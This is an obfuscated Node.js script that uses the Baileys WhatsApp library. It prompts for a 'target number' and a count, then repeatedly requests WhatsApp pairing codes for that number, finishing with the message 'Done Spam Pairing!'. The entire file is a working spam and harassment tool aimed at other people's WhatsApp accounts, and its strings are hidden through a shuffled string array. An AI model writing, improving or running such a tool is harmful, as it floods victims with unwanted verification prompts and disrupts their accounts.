const a0_0x30623b = a0_0x44fa;
function a0_0xb75d() {
  const _0x19ee52 = [
    "\x1b[0m",
    "error",
    "5kNokIH",
    "readline",
    "474187ahHtQr",
    "silent",
    "stdout",
    "20.0.04",
    "33984fcOAGS",
    "Not\x20For\x20Sale.\x20Script\x20by\x20BY-FADLI IT GANZ",
    "Chrome",
    "\x1b[44m",
    "@whiskeysockets/baileys",
    "1349704TNrArR",
    "stdin",
    "\x1b[30m",
    "createInterface",
    "📋\x20Pairing\x20Codes\x20List:",
    "9366453ONkahG",
    "match",
    "pino",
    "clear",
    "⚠️\x20Example:\x2020.",
    "question",
    "join",
    "log",
    "5290458NuUSIQ",
    "🔢\x20Amount:\x20",
    "144SmojZc",
    "Ubuntu",
    "26471680ojBpuN",
    "17075KfAFFh",
    "❌\x20Error:\x20",
    "./session",
    "104Gbuumf",
  ];
  a0_0xb75d = function () {
    return _0x19ee52;
  };
  return a0_0xb75d();
}
(function (_0x1764e7, _0x1cdcd7) {
  const _0x3d9dfd = a0_0x44fa,
    _0x3c3c13 = _0x1764e7();
  while (!![]) {
    try {
      const _0x524847 =
        parseInt(_0x3d9dfd(0x1ba)) / 0x1 +
        -parseInt(_0x3d9dfd(0x1a8)) / 0x2 +
        (-parseInt(_0x3d9dfd(0x1b7)) / 0x3) *
          (parseInt(_0x3d9dfd(0x1a3)) / 0x4) +
        (parseInt(_0x3d9dfd(0x1c0)) / 0x5) *
          (-parseInt(_0x3d9dfd(0x1b5)) / 0x6) +
        (parseInt(_0x3d9dfd(0x1c2)) / 0x7) *
          (parseInt(_0x3d9dfd(0x1bd)) / 0x8) +
        -parseInt(_0x3d9dfd(0x1ad)) / 0x9 +
        parseInt(_0x3d9dfd(0x1b9)) / 0xa;
      if (_0x524847 === _0x1cdcd7) break;
      else _0x3c3c13["push"](_0x3c3c13["shift"]());
    } catch (_0x350010) {
      _0x3c3c13["push"](_0x3c3c13["shift"]());
    }
  }
})(a0_0xb75d, 0x83c6c);
const { default: makeWASocket, useMultiFileAuthState } = require(
    a0_0x30623b(0x1a7),
  ),
  pino = require(a0_0x30623b(0x1af)),
  readline = require(a0_0x30623b(0x1c1)),
  bgColorStart = a0_0x30623b(0x1a6),
  bgColorEnd = a0_0x30623b(0x1be),
  textColor = a0_0x30623b(0x1aa),
  pairingCodeColor = "\x1b[42m\x1b[30m",
  notForSaleText = "\x1b[41m\x1b[33m",
  question = (_0xcb0bee) => {
    const _0x5c8b6b = a0_0x30623b,
      _0x4c8aae = readline[_0x5c8b6b(0x1ab)]({
        input: process[_0x5c8b6b(0x1a9)],
        output: process[_0x5c8b6b(0x1a1)],
      });
    return new Promise((_0x5eb337) => {
      const _0x44a62b = _0x5c8b6b;
      _0x4c8aae[_0x44a62b(0x1b2)](_0xcb0bee, (_0x1eb1a4) => {
        _0x5eb337(_0x1eb1a4), _0x4c8aae["close"]();
      });
    });
  };
function a0_0x44fa(_0x9e53ef, _0x2a6175) {
  const _0xb75d40 = a0_0xb75d();
  return (
    (a0_0x44fa = function (_0x44fa4e, _0x437aea) {
      _0x44fa4e = _0x44fa4e - 0x1a0;
      let _0x116f77 = _0xb75d40[_0x44fa4e];
      return _0x116f77;
    }),
    a0_0x44fa(_0x9e53ef, _0x2a6175)
  );
}
async function RamaProject() {
  const _0x3b1085 = a0_0x30623b,
    { state: _0x5e9d54 } = await useMultiFileAuthState(_0x3b1085(0x1bc)),
    _0x19c2b3 = makeWASocket({
      logger: pino({ level: _0x3b1085(0x1a0) }),
      printQRInTerminal: ![],
      auth: _0x5e9d54,
      connectTimeoutMs: 0xea60,
      defaultQueryTimeoutMs: 0x0,
      keepAliveIntervalMs: 0x2710,
      emitOwnEvents: !![],
      fireInitQueries: !![],
      generateHighQualityLinkPreview: !![],
      syncFullHistory: !![],
      markOnlineOnConnect: !![],
      browser: [_0x3b1085(0x1b8), _0x3b1085(0x1a5), _0x3b1085(0x1a2)],
    });
  console[_0x3b1085(0x1b0)](),
    console[_0x3b1085(0x1b4)](
      "\x0a" + notForSaleText + _0x3b1085(0x1a4) + bgColorEnd,
    );
  try {
    const _0x464569 = await question(
        bgColorStart +
          textColor +
          "📞\x20Enter\x20target\x20number:\x20" +
          bgColorEnd,
      ),
      _0x291dcf = parseInt(
        await question(
          bgColorStart + textColor + _0x3b1085(0x1b6) + bgColorEnd,
        ),
      );
    if (isNaN(_0x291dcf) || _0x291dcf <= 0x0) {
      console[_0x3b1085(0x1b4)](
        bgColorStart + textColor + _0x3b1085(0x1b1) + bgColorEnd,
      );
      return;
    }
    console[_0x3b1085(0x1b4)](
      "\x0a" + bgColorStart + textColor + _0x3b1085(0x1ac) + bgColorEnd,
    );
    for (let _0x2f10f9 = 0x0; _0x2f10f9 < _0x291dcf; _0x2f10f9++) {
      try {
        let _0x28171d = await _0x19c2b3["requestPairingCode"](_0x464569);
        (_0x28171d =
          _0x28171d?.[_0x3b1085(0x1ae)](/.{1,4}/g)?.[_0x3b1085(0x1b3)]("-") ||
          _0x28171d),
          console[_0x3b1085(0x1b4)](
            pairingCodeColor +
              ("\x20" +
                (_0x2f10f9 + 0x1) +
                ".\x20" +
                _0x464569 +
                "\x20[" +
                _0x28171d +
                "]\x20") +
              bgColorEnd,
          );
      } catch (_0x1f578e) {
        console[_0x3b1085(0x1bf)](
          bgColorStart +
            textColor +
            _0x3b1085(0x1bb) +
            _0x1f578e["message"] +
            bgColorEnd,
        );
      }
    }
    console[_0x3b1085(0x1b4)](
      "\x0a" + notForSaleText + "Done\x20Spam\x20Pairing!" + bgColorEnd,
    ),
      process["exit"]();
  } catch (_0x3210e4) {
    console["error"](
      bgColorStart +
        textColor +
        _0x3b1085(0x1bb) +
        _0x3210e4["message"] +
        bgColorEnd,
    );
  }
  return _0x19c2b3;
}
console["log"](
  bgColorStart + textColor + "🚀\x20Pairing\x20Code\x20Start..." + bgColorEnd,
),
  RamaProject();
